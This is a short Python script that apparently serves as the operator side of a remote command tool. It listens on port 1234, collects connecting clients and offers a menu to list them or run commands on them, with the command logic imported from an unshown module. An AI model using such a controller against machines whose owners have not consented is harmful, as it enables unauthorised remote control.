from socket import *
import threading
from funcoes import menu, show_clients, run_cmd

def manager(servidor):
    while True:
        client, addr = servidor.accept()
        clients.append([client, addr])


servidor = socket(AF_INET, SOCK_STREAM)
servidor.bind(("", 1234))
servidor.listen(100)

clients = []

t = threading.Thread(target=manager, args=(servidor,))
t.start()

while True:
    menu()
    opção = int(input("[+] Command >>> "))
    if opção == 1:
        show_clients(clients)
    if opção == 2:
        run_cmd(clients)

